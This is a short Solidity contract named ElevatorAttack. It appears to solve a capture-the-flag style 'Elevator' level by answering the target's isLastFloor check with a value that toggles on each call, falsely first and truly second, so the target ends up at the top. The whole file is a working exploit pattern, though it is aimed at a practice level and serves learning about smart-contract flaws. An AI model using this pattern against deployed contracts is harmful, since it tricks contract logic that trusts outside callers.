// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../levels/Elevator/Elevator.sol";

contract ElevatorAttack {
    bool top = false;

    function attack(address target) external {
        Elevator(target).goTo(0);
    }

    function isLastFloor(uint256) external returns (bool) {
        bool _top = top;
        top = !top;
        return _top;
    }
}
